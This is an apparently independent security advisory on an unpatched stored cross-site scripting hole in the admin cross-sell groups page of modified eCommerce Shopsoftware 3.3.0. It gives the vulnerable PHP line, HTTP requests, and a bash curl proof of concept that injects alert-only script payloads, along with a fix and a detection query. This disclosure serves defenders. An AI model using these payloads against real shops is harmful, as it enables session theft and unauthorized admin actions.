# Security Advisory: Stored Cross-Site Scripting in admin/cross_sell_groups.php — Group Name Field

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability in `admin/cross_sell_groups.php`. The cross-sell group name field is saved via `xtc_db_prepare_input()` (trim + stripslashes, no HTML encoding) and later echoed into the admin page without `htmlspecialchars()`. An admin can inject persistent JavaScript that executes in the browsers of all admins who subsequently view the cross-sell groups listing.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/cross_sell_groups.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

Cross-sell group records are saved with `xtc_db_prepare_input($_POST['groupname'])`. When the groups list is rendered, the group name is echoed with no output encoding:

```php
// admin/cross_sell_groups.php:145 (approximate)
echo $cross_sell['groupname'];
// $cross_sell['groupname'] came from DB, originally from POST['groupname']
// xtc_db_prepare_input = trim() + stripslashes() — no htmlspecialchars()
```

An attacker inserts `<script>alert(1)</script>` as the group name. The DB stores the raw tag. Every admin page load that lists cross-sell groups executes the script.

### Necessary Conditions

- **Authentication:** Admin (to create/edit a cross-sell group)
- **User interaction:** Required — another admin must view the cross-sell groups page
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session tokens, admin CSRF tokens accessible from DOM
- **Integrity:** Low — arbitrary admin actions via victim's session
- **Availability:** None

---

## 5. Classification

### CVSS

- **Score:** 4.8
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

### CAPEC

- CAPEC-198: XSS Stored

---

## 6. Exploitation Scenario

1. Admin A creates a cross-sell group with name: `<script>alert(document.cookie)</script>`
2. Payload stored in DB without encoding.
3. Admin B views the cross-sell groups page.
4. Browser renders the stored script and executes it in Admin B's context.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/cross_sell_groups.php (line 145)
         Database table: cross_sell_groups (groupname column)
Parameter(s): groupname (POST)
Method: POST · Authentication: Admin
```

### Example Request (inject payload)

```http
POST /admin/cross_sell_groups.php?action=insert HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<securityToken>=<CSRF_VALUE>&groupname=<script>alert(document.domain)</script>
```

### Example Request (trigger)

```http
GET /admin/cross_sell_groups.php HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
```

### Observed Response

```html
HTTP/1.1 200 OK

<td class="dataTableContent"><script>alert(document.domain)</script></td>
```

### Result

Confirmed in authorized Docker lab. Group name saved with XSS payload. On subsequent page load by any admin, script executes.

**Evidence:** `<script>alert(document.domain)</script>` unencoded in HTTP response body.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V12 PoC — Stored XSS in admin/cross_sell_groups.php
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Get CSRF token
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/cross_sell_groups.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+')

echo "CSRF: $CSRF"

# Step 2: Insert group with XSS payload
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "http://TARGET/admin/cross_sell_groups.php?action=insert" \
  --data-urlencode "securityToken=$CSRF" \
  --data-urlencode 'groupname=<script>alert(document.domain)</script>' \
  -o /dev/null

# Step 3: Retrieve cross-sell groups page — confirm payload in response
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/cross_sell_groups.php" | grep -i "script"

# Expected: <script>alert(document.domain)</script> in response body
```

### Expected Result

```text
HTTP/1.1 200 OK
[Response body contains:]
<td class="dataTableContent"><script>alert(document.domain)</script></td>
```

### PoC Limitations

- Benign alert-only payload; no data exfiltration.
- Record can be deleted after testing.

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Cross-Sell Groups → New Group.
3. Enter `<script>alert(1)</script>` in the Group Name field. Save.
4. Reload the cross-sell groups list — script executes.

---

## 10. Mitigation

- Wrap echo with `htmlspecialchars($cross_sell['groupname'], ENT_QUOTES, 'UTF-8')`.
- Validate group name input to disallow HTML special characters.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// admin/cross_sell_groups.php — Vulnerable:
echo $cross_sell['groupname'];

// Fixed:
echo htmlspecialchars($cross_sell['groupname'], ENT_QUOTES, 'UTF-8');
```

---

## 12. Detection and Indicators

- `cross_sell_groups.groupname` column containing HTML tags.

### Example Log Search

```text
SELECT cross_sell_groups_id, groupname FROM cross_sell_groups WHERE groupname LIKE '%<%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
